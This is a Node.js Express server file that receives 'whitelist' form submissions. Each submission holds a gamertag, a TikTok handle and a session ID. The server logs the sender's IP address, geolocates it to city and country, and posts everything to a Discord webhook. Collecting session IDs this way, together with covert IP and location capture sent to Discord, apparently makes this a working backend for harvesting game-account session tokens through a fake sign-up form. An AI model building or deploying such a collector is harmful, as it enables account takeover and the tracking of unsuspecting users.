import express from 'express';
import cors from 'cors';
import axios from 'axios';
const app = express();

// Add your Discord Webhook URL here
const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK;
app.use(cors());
app.use(express.urlencoded({ extended: false }));
app.use(express.json());

// Define the endpoint to handle form submissions
app.post('/', async (req, res) => {
  if (req.body.tiktok == "wake up") {
     sendTestMessage();
     res.send("Woke up succesfully!")
     return; 
  }
  const gamertag = req.body.gamertag;
  const tiktok = req.body.tiktok || 'Not provided';
  const sessionID = req.body.sessionID;
  const ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress).split(',')[0].replace("::ffff:","");
  console.log(" IP : " + ip)
/*await axios.post(DISCORD_WEBHOOK_URL, {
  content: `New submission: ${gamertag} | ${ip}`
});*/

 let locationString =  "Unknown Location";
  try {

       const geo = await axios.get(`https://freeipapi.com/api/json/${ip}`);
       const location = geo.data;
       console.log(JSON.stringify(location))
       locationString = `${location.cityName || 'Unknown City'}, ${location.regionName || 'Unknown Region'}, ${location.countryCode || 'Unknown Country'}`;
  } catch (error) {
      console.error("Error getting location: " + error.message)

  }
  try {
    // Get geolocation
  

    // Build the message for Discord
    const payload = {
      embeds: [
        {
          title: 'New Submission',
          color: 0x00ffcc,
          fields: [
            { name: 'Gamertag', value: gamertag, inline: true },
            { name: 'TikTok', value: tiktok, inline: false },
            { name: 'IP', value: ip, inline: false },
            { name: 'Location', value: locationString, inline: false },
            { name: 'Session ID', value: sessionID, inline: false },
            
          ],
          timestamp: new Date()
        }
      ]
    };

    // Send to Discord
    await axios.post(DISCORD_WEBHOOK_URL, payload);

    console.log(`New submission: ${gamertag} | ${tiktok} | ${ip} | ${locationString}`);
    res.sendStatus(200);
  } catch (error) {
    console.error('Error handling submission:', error.message);
    res.status(500).send('Submission failed');
  }
});
const sendTestMessage = async () => {
  try {
    await axios.post(DISCORD_WEBHOOK_URL, {
      content: 'Whitelist test server is LIVE!'
    });
  } catch (err) {
    console.error('Failed to send test message to Discord:', err.message);
  }
};

const PORT = process.env.PORT || 25821;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
  //sendTestMessage();
});
